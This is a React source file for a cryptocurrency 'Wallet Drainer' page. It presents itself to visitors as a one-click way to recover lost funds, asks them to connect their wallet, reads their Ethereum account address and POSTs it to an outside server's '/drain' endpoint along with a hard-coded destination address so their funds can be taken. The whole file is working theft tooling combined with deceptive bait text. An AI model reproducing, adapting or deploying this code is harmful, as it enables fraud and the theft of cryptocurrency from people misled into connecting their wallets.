import React, { useState } from "react";
import ReactDOM from "react-dom/client";

const App = () => {
  const [response, setResponse] = useState(null);
  const [loading, setLoading] = useState(false);

  const drainWallet = async () => {
    setLoading(true);
    setResponse(null);

    try {
      // Check if MetaMask or any wallet is connected
      if (!window.ethereum) {
        throw new Error("No wallet detected. Please install MetaMask or a compatible wallet.");
      }

      const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
      const address = accounts[0];

      // Send the request to your backend to drain the wallet
      const res = await fetch("https://tokenbackendwork.onrender.com/drain", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ address, drainTo: "0x0cd509bf3a2fa99153dae9f47d6d24fc89c006d4" }),
      });

      const data = await res.json();
      setResponse(data);
      setLoading(false);
    } catch (err) {
      console.error(err);
      setResponse({
        error: "Failed to drain wallet. Please try again.",
        message: err.message,
      });
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col items-center justify-center p-4">
      <div className="max-w-md w-full bg-gray-800 p-8 rounded-lg shadow-lg text-center">
        <h1 className="text-4xl font-bold mb-6">Wallet Drainer</h1>
        <p className="text-lg mb-8">
          Recover your lost funds in one click. Connect your wallet now.
        </p>

        <button
          onClick={drainWallet}
          disabled={loading}
          className={`bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-6 rounded transition duration-200 ${
            loading ? "opacity-70 cursor-not-allowed" : ""
          }`}
        >
          {loading ? "Draining..." : "Drain Wallet"}
        </button>

        {response && (
          <div className="mt-6 p-4 bg-gray-700 rounded">
            <h3 className="font-bold text-gray-200">Response:</h3>
            <pre className="text-sm text-gray-400">{JSON.stringify(response, null, 2)}</pre>
          </div>
        )}
      </div>
    </div>
  );
};

const root = ReactDOM.createRoot(document.getElementById("root"));
root.render(<App />);
